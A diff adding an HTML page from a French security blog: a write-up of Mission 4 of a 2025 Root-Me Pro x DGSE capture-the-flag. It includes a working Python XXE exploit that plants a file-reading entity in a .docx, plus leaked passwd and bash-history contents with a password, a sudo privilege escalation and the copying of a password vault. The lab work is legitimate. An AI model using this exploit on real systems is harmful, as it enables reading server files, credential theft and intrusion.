@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="fr-fr" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Mission 4 - Pentest# Certainement la mission la plus compliquée de ce challenge. notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :
+Signer des documents .docx. Vérifier le propriétaire d’un document signé. 1 - Reconaissance# On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d’affiche avec l’identifiant de la victime.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/writeups/rootmepro2025/collapsed/mission4/">
+  <meta property="og:site_name" content="Blog de @camillegr">
+  <meta property="og:title" content="Mission 4 - Pentest">
+  <meta property="og:description" content="Mission 4 - Pentest# Certainement la mission la plus compliquée de ce challenge. notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :
+Signer des documents .docx. Vérifier le propriétaire d’un document signé. 1 - Reconaissance# On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d’affiche avec l’identifiant de la victime.">
+  <meta property="og:locale" content="fr_fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="Mission 4 - Pentest">
+  <meta itemprop="description" content="Mission 4 - Pentest# Certainement la mission la plus compliquée de ce challenge. notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :
+Signer des documents .docx. Vérifier le propriétaire d’un document signé. 1 - Reconaissance# On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d’affiche avec l’identifiant de la victime.">
+  <meta itemprop="wordCount" content="559">
+
+<title>Mission 4 - Pentest | Blog de @camillegr</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/writeups/rootmepro2025/collapsed/mission4/">
+<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.da0a16d1ba483677ab07a837da96741f344c643b8be2a499c1b38f29fbe24a54.js" integrity="sha256-2goW0bpINnerB6g32pZ0HzRMZDuL4qSZwbOPKfviSlQ=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
+    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
+      <a role="button" class="">
+        Projets Personnels</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/projets/collapsed/tofuzz/" class="">
+      ToFuzz</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c65aa4e708b6bdd64019a9cd49da31df" class="toggle"  />
+    <label for="section-c65aa4e708b6bdd64019a9cd49da31df" class="flex">
+      <a href="/docs/tryhackme/" class="">
+        TryHackMe</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/hammer/" class="">
+      Hammer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/mrrobot/" class="">
+      Mr Robot</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/rootme/" class="">
+      RootMe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme/collapsed/wonderlands/" class="">
+      Wonderlands</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4ed5b609d03974b5783bb2c6341f2bf" class="toggle" checked />
+    <label for="section-c4ed5b609d03974b5783bb2c6341f2bf" class="flex">
+      <a href="/docs/writeups/" class="">
+        Writeups</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3ec5a319b7889f85b1f653793946f6b8" class="toggle" checked />
+    <label for="section-3ec5a319b7889f85b1f653793946f6b8" class="flex">
+      <a href="/docs/writeups/rootmepro2025/" class="">
+        CTF 2025 | Root-Me Pro x DGSE</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission1/" class="">
+      Mission 1 - IA</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission2/" class="">
+      Mission 2 - SOC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission3/" class="">
+      Mission 3 - Forensic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission4/" class="active">
+      Mission 4 - Pentest</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission5/" class="">
+      Mission 5 - Mobile</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission6/" class="">
+      Mission 6 - OSINT</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a>
+      Divers</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/divers/blogs/" class="">
+      Blogs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Mission 4 - Pentest</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mission-4---pentest">Mission 4 - Pentest</a>
+      <ul>
+        <li><a href="#1---reconaissance">1 - Reconaissance</a></li>
+        <li><a href="#2---injection-xxe">2 - Injection XXE</a>
+          <ul>
+            <li><a href="#récupération-des-utilisateurs">Récupération des utilisateurs</a></li>
+            <li><a href="#bash-history">Bash History</a></li>
+            <li><a href="#sshd-config">SSHD Config</a></li>
+          </ul>
+        </li>
+        <li><a href="#3---escalade-de-privilege">3 - Escalade de privilege</a></li>
+        <li><a href="#4---exfiltration-des-données">4 - Exfiltration des données</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="mission-4---pentest">Mission 4 - Pentest<a class="anchor" href="#mission-4---pentest">#</a></h1>
+<p><img src="../img/nullvastation-m4-doctracker.png" alt="DocTracker" /></p>
+<p>Certainement la mission la plus compliquée de ce challenge.  notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :</p>
+<ul>
+<li>Signer des documents .docx.</li>
+<li>Vérifier le propriétaire d&rsquo;un document signé.</li>
+</ul>
+<h2 id="1---reconaissance">1 - Reconaissance<a class="anchor" href="#1---reconaissance">#</a></h2>
+<p>On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d&rsquo;affiche avec l&rsquo;identifiant de la victime.</p>
+<p>Le message affichant l&rsquo;identifiant de la victime, on peut supposer que l&rsquo;identifiant est un champ vulnérable pour une injection. En décompressant le .docx on s&rsquo;aperçoit que l&rsquo;identifiant de la victime est stocké en dur dans le document.  une modification manuelle permet de confirmer cette hypothèse.</p>
+<h2 id="2---injection-xxe">2 - Injection XXE<a class="anchor" href="#2---injection-xxe">#</a></h2>
+<p>Le champ injectable étant reflété dans l&rsquo;application on vérifie s&rsquo;il est possible d&rsquo;utiliser une vulnérabilité XXE. Le site est bien faillible et on peut automatiser l&rsquo;injection pour essayer de trouver des fichiers et dossiers intéressants.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> zipfile
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> shutil
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> uuid
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> lxml <span style="color:#ff6ac1">import</span> etree
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># === CONFIG ===</span>
+</span></span><span style="display:flex;"><span>UPLOAD_URL <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://163.172.67.183/&#34;</span>
+</span></span><span style="display:flex;"><span>READ_URL <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://163.172.67.183/read&#34;</span>
+</span></span><span style="display:flex;"><span>BASENAME <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;evil&#34;</span>
+</span></span><span style="display:flex;"><span>BASE_DOCX <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;input/modified_unsigned.docx&#34;</span>
+</span></span><span style="display:flex;"><span>MODIFIED_DOCX <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;output/</span><span style="color:#5af78e">{</span>BASENAME<span style="color:#5af78e">}</span><span style="color:#5af78e">_patched.docx&#34;</span>
+</span></span><span style="display:flex;"><span>TMP_DIR <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;tmp_dir&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># === FONCTIONS ===</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">create_docx</span>(path):
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;&#34;&#34;Crée un .docx minimal&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">from</span> docx <span style="color:#ff6ac1">import</span> Document
+</span></span><span style="display:flex;"><span>    doc <span style="color:#ff6ac1">=</span> Document()
+</span></span><span style="display:flex;"><span>    doc<span style="color:#ff6ac1">.</span>add_paragraph(<span style="color:#5af78e">&#34;Hello Victim&#34;</span>)
+</span></span><span style="display:flex;"><span>    doc<span style="color:#ff6ac1">.</span>save(path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">unzip_docx</span>(docx_path, extract_dir):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> zipfile<span style="color:#ff6ac1">.</span>ZipFile(docx_path, <span style="color:#5af78e">&#39;r&#39;</span>) <span style="color:#ff6ac1">as</span> zip_ref:
+</span></span><span style="display:flex;"><span>        zip_ref<span style="color:#ff6ac1">.</span>extractall(extract_dir)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">rezip_docx</span>(src_dir, output_path):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> zipfile<span style="color:#ff6ac1">.</span>ZipFile(output_path, <span style="color:#5af78e">&#39;w&#39;</span>, zipfile<span style="color:#ff6ac1">.</span>ZIP_DEFLATED) <span style="color:#ff6ac1">as</span> docx:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> foldername, _, filenames <span style="color:#ff6ac1">in</span> os<span style="color:#ff6ac1">.</span>walk(src_dir):
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">for</span> filename <span style="color:#ff6ac1">in</span> filenames:
+</span></span><span style="display:flex;"><span>                file_path <span style="color:#ff6ac1">=</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(foldername, filename)
+</span></span><span style="display:flex;"><span>                arcname <span style="color:#ff6ac1">=</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>relpath(file_path, src_dir)
+</span></span><span style="display:flex;"><span>                docx<span style="color:#ff6ac1">.</span>write(file_path, arcname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">corrupt_appxml</span>(appxml_path, path_to_read):
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;&#34;&#34;Modifie la balise VictimID dans app.xml&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    NEW_XML<span style="color:#ff6ac1">=</span><span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39; standalone=&#39;yes&#39;?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>    NEW_XML<span style="color:#ff6ac1">=</span>NEW_XML<span style="color:#ff6ac1">+</span><span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM </span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">file://</span><span style="color:#5af78e">{</span>path_to_read<span style="color:#ff6ac1">.</span>strip()<span style="color:#5af78e">}</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&gt;&lt;!ENTITY safe </span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&lt;![CDATA[&amp;xxe;]]</span><span style="color:#5af78e">\&#34;</span><span style="color:#5af78e">&gt;]&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e">#NEW_XML=NEW_XML+&#34;&#34;&#34;&lt;!ENTITY xxe SYSTEM &#34;$(whoami)&#34;&gt;&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    NEW_XML<span style="color:#ff6ac1">=</span>NEW_XML<span style="color:#ff6ac1">+</span><span style="color:#5af78e">&#34;&#34;&#34;&lt;Properties xmlns=&#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&#34; xmlns:vt=&#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&#34;&gt;&lt;VictimID&gt;&amp;xxe;&lt;/VictimID&gt;&lt;/Properties&gt;&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(NEW_XML)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(appxml_path, <span style="color:#5af78e">&#34;w&#34;</span>) <span style="color:#ff6ac1">as</span> out :
+</span></span><span style="display:flex;"><span>        out<span style="color:#ff6ac1">.</span>write(NEW_XML)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_docx_to_read</span>(path):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    signed_files <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#5af78e">&#39;file&#39;</span>: (os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>basename(<span style="color:#5af78e">&#34;signed_evil_temp_docx.docx&#34;</span>), <span style="color:#ff5c57">open</span>(path, <span style="color:#5af78e">&#39;rb&#39;</span>), <span style="color:#5af78e">&#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>post(READ_URL, files<span style="color:#ff6ac1">=</span>signed_files)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(r<span style="color:#ff6ac1">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> r<span style="color:#ff6ac1">.</span>text <span style="color:#ff6ac1">if</span> r<span style="color:#ff6ac1">.</span>status_code<span style="color:#ff6ac1">==</span><span style="color:#ff9f43">200</span> <span style="color:#ff6ac1">else</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;HTTP </span><span style="color:#5af78e">{</span>r<span style="color:#ff6ac1">.</span>status_code<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">__name__</span> <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">&#34;vuln.dict&#34;</span>,<span style="color:#5af78e">&#34;r&#34;</span>) <span style="color:#ff6ac1">as</span> dic:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> payload <span style="color:#ff6ac1">in</span> dic<span style="color:#ff6ac1">.</span>readlines() : 
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;### TEST : </span><span style="color:#5af78e">{</span> payload<span style="color:#ff6ac1">.</span>strip()<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(BASE_DOCX):
+</span></span><span style="display:flex;"><span>                create_docx(BASE_DOCX)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            os<span style="color:#ff6ac1">.</span>makedirs(TMP_DIR, exist_ok<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>)
+</span></span><span style="display:flex;"><span>            unzip_docx(BASE_DOCX, TMP_DIR)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            appxml_path <span style="color:#ff6ac1">=</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(TMP_DIR, <span style="color:#5af78e">&#34;docProps&#34;</span>, <span style="color:#5af78e">&#34;app.xml&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>isfile(appxml_path):
+</span></span><span style="display:flex;"><span>                <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;[-] ERREUR : docProps/app.xml introuvable.&#34;</span>)
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#ff9f43">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            corrupt_appxml(appxml_path,payload)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            rezip_docx(TMP_DIR, MODIFIED_DOCX)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            msg <span style="color:#ff6ac1">=</span> send_docx_to_read(MODIFIED_DOCX)  
+</span></span><span style="display:flex;"><span>            </span></span></code></pre></div><p>En cherchant des informations on trouve plusieurs fichiers intéressants :</p>
+<h3 id="récupération-des-utilisateurs">Récupération des utilisateurs<a class="anchor" href="#r%c3%a9cup%c3%a9ration-des-utilisateurs">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tpl" data-lang="tpl"><span style="display:flex;"><span>  document-user:x:999:996::/home/document-user:/bin/sh
+</span></span><span style="display:flex;"><span>  executor:x:996:995::/home/executor:/bin/bash
+</span></span><span style="display:flex;"><span>  administrator:x:995:994::/home/administrator:/bin/bash</span></span></code></pre></div><h3 id="bash-history">Bash History<a class="anchor" href="#bash-history">#</a></h3>
+<p>On récupère un mot de passe dans l&rsquo;historique de l&rsquo;utilisateur courant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/document-user/.bash_history 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flask run --host<span style="color:#ff6ac1">=</span>0.0.0.0 --port<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">5000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">\&#34;</span>cABdTXRyUj5qgAEl0Zc0a<span style="color:#5af78e">\&#34;</span> &gt;&gt; /tmp/exec_ssh_password.tmp
+</span></span><span style="display:flex;"><span>ps aux | grep flask
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> templates/</span></span></code></pre></div><h3 id="sshd-config">SSHD Config<a class="anchor" href="#sshd-config">#</a></h3>
+<p>Vérification du SSHD_CONFIG : Service ouvert sur 22222. Avec l&rsquo;utilisateur et le mot de passe on se connecte et on obtient un shell sur la machine.x</p>
+<h2 id="3---escalade-de-privilege">3 - Escalade de privilege<a class="anchor" href="#3---escalade-de-privilege">#</a></h2>
+<p>Une fois connecté, il apparaît que l&rsquo;utilisateur n&rsquo;a pas un haut niveau de privlège, nous allons donc voir s&rsquo;il est possible de pivoter vers un autre utilisateur. en vérifiant les privilèges sudo, on voit que la commande screenfetch est exécutable en tant qu&rsquo;administrator.</p>
+<p>On tente une escalade de privilège vers l&quot;utilisateur administrator :</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l 
+</span></span><span style="display:flex;"><span>screenfetch -s -S .. 
+</span></span><span style="display:flex;"><span>shell administrator </span></span></code></pre></div><h2 id="4---exfiltration-des-données">4 - Exfiltration des données<a class="anchor" href="#4---exfiltration-des-donn%c3%a9es">#</a></h2>
+<ul>
+<li>Exfiltration du logo et du vault.kdbx :
+dans /app/app.py (récupérable avec la première faille XXE), on observe que le programme écrit sur
+/dev/shm/uploads et /dev/shm/work. on peut y écrire avec executor.</li>
+</ul>
+<p>‘‘‘
+mkdir /dev/shm/mydir
+cp /home/administrator/vault.kdbx /dev/shm/mydir
+cp /home/administrator/logo.jpg /dev/shm/mydir
+chmod 777 /dev/shm/mydir -R
+‘‘‘</p>
+<p>Le logo est bien evidemment la clé du coffre-fort où l&rsquo;on trouve le drapeau.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/writeups/rootmepro2025/collapsed/mission3/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Mission 3 - Forensic</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/writeups/rootmepro2025/collapsed/mission5/" class="flex align-center">
+        <span>Mission 5 - Mobile</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mission-4---pentest">Mission 4 - Pentest</a>
+      <ul>
+        <li><a href="#1---reconaissance">1 - Reconaissance</a></li>
+        <li><a href="#2---injection-xxe">2 - Injection XXE</a>
+          <ul>
+            <li><a href="#récupération-des-utilisateurs">Récupération des utilisateurs</a></li>
+            <li><a href="#bash-history">Bash History</a></li>
+            <li><a href="#sshd-config">SSHD Config</a></li>
+          </ul>
+        </li>
+        <li><a href="#3---escalade-de-privilege">3 - Escalade de privilege</a></li>
+        <li><a href="#4---exfiltration-des-données">4 - Exfiltration des données</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
